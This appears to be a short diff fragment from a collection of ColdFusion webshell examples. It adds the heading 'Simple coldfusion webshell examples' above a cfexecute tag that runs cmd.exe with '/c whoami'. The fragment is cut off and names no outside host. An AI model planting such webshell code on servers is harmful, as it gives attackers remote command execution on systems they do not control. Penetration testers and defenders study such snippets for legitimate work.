@@ -1,3 +1,5 @@
+#Simple coldfusion webshell examples
+
 #Execute command to output file
 <cfexecute name = "C:\windows\System32\cmd.exe" 
 arguments = "/c whoami" 
